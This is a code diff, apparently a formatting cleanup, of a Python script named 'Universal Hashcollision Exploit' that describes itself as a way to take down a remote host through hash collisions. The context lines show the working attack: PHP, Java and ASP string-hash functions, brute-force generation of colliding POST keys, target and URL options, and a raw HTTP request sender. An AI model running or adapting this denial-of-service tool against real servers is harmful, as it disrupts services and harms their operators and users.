@@ -89,12 +89,12 @@ class Payloadgenerator:
         for i in charrange:
             a = a + chr(i)
         source = list(itertools.product(a, repeat=length))
-        basestr = ''.join(random.choice(source))
+        basestr = "".join(random.choice(source))
         basehash = function(basestr)
         hashes[str(counter)] = basestr
         counter = counter + 1
         for item in source:
-            tempstr = ''.join(item)
+            tempstr = "".join(item)
             if tempstr == basestr:
                 continue
             if function(tempstr) == basehash:
@@ -128,15 +128,15 @@ class Payloadgenerator:
             counter = counter - 1
         return int(round(result))
 
-    #PHP
+    # PHP
     def _DJBX33A(self, inputstring):
         return self._DJBXA(inputstring, 33, 5381)
 
-    #Java
+    # Java
     def _DJBX31A(self, inputstring):
         return self._DJBXA(inputstring, 31, 0)
 
-    #ASP
+    # ASP
     def _DJBX33X(self, inputstring):
         counter = len(inputstring) - 1
         result = 5381
@@ -167,7 +167,7 @@ class Payloadgenerator:
     def _base_convert(self, num, base):
         fullalphabet = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"
         alphabet = fullalphabet[:base]
-        if (num == 0):
+        if num == 0:
             return alphabet[0]
         arr = []
         base = len(alphabet)
@@ -181,7 +181,8 @@ class Payloadgenerator:
 
 def main():
     parser = argparse.ArgumentParser(
-        description="Take down a remote Host via Hashcollisions", prog="Universal Hashcollision Exploit")
+        description="Take down a remote Host via Hashcollisions", prog="Universal Hashcollision Exploit"
+    )
     parser.add_argument("-u", "--url", dest="url", help="Url to attack", required=True)
     parser.add_argument("-w", "--wait", dest="wait", action="store_true", default=False, help="wait for Response")
     parser.add_argument("-c", "--count", dest="count", type=int, default=1, help="How many requests")
@@ -192,18 +193,21 @@ def main():
         "-o",
         "--output",
         dest="output",
-        help="Save Server response to file. This name is only a pattern. HTML Extension will be appended. Implies -w")
+        help="Save Server response to file. This name is only a pattern. HTML Extension will be appended. Implies -w",
+    )
     parser.add_argument(
-        "-t", "--target", dest="target", help="Target of the attack", choices=["ASP", "PHP", "JAVA"], required=True)
+        "-t", "--target", dest="target", help="Target of the attack", choices=["ASP", "PHP", "JAVA"], required=True
+    )
     parser.add_argument(
         "-m",
         "--max-payload-size",
         dest="maxpayloadsize",
-        help=
-        "Maximum size of the Payload in Megabyte. PHPs defaultconfiguration does not allow more than 8MB, Tomcat is 2MB",
-        type=int)
+        help="Maximum size of the Payload in Megabyte. PHPs defaultconfiguration does not allow more than 8MB, Tomcat is 2MB",
+        type=int,
+    )
     parser.add_argument(
-        "-g", "--generate", dest="generate", help="Only generate Payload and exit", default=False, action="store_true")
+        "-g", "--generate", dest="generate", help="Only generate Payload and exit", default=False, action="store_true"
+    )
     parser.add_argument("--version", action="version", version="%(prog)s 6.0")
 
     options = parser.parse_args()
@@ -260,7 +264,7 @@ def main():
         if options.target == "PHP":
             payload = generator.generatePHPPayload()
         elif options.target == "ASP":
-            #payload = generateASPPayload()
+            # payload = generateASPPayload()
             print("Target %s not yet implemented" % options.target)
             sys.exit(1)
         elif options.target == "JAVA":
@@ -319,7 +323,9 @@ User-Agent: Mozilla/5.0 (Windows; U; Windows NT 6.1; de; rv:1.9.2.20) Gecko/2011
 Content-Length: %s\r\n\
 \r\n\
 %s\r\n\
-\r\n" % (path, host, str(len(payload)), payload)
+\r\n" % (
+            path, host, str(len(payload)), payload
+        )
 
         if url.scheme == "https":
             ssl_sock.send(request)
